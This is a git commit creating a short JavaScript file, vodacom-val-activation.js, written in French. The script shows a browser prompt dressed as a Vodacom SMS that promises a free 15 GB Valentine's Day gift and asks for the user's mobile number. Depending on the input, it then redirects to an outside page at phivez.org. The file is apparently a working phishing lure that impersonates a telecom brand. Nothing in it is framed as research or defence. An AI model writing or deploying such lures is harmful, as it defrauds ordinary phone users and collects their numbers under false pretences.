03fd29136d35fb496e871c861f0a758307ecbf46
newblog13 <sweet16guyz@gmail.com>
2026-02-07 08:05:34 +0100

    Create vodacom-val-activation.js

---
+++ vodacom-val-activation.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 15 Go'
+password=prompt('SMS: Félicitations, votre numéro Vodacom est éligible pour recevoir un cadeau de Saint-Valentin de 15 Go. Cliquez sur OK pour saisir votre numéro de mobile.','ACTIVER 15 Go');
+if (password != 'ACTIVER 15 Go') {
+location.href='https://phivez.org/val-vodacom.html';
+}
